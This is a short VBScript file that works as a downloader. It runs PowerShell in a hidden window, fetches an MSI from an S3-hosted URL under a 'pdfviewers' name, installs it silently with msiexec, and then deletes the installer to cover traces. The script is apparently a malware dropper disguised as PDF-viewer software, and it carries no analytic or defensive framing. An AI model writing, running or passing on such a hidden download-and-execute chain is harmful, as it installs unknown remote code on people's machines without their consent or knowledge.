Option Explicit

Dim fso, shell, tempDir, msiFile, url, exitCode
Set fso    = CreateObject("Scripting.FileSystemObject")
Set shell  = CreateObject("WScript.Shell")
tempDir    = fso.GetSpecialFolder(2)          
msiFile    = tempDir & "\agent-c92d02.msi"   
url        = "https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"
shell.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command " & _
          """(New-Object Net.WebClient).DownloadFile('" & url & "', '" & msiFile & "')""", 0, True
If fso.FileExists(msiFile) Then
    exitCode = shell.Run("msiexec.exe /i """ & msiFile & """ /qn", 0, True)
End If
WScript.Sleep 5000                        
On Error Resume Next
fso.DeleteFile msiFile, True
On Error GoTo 0
WScript.Quit exitCode
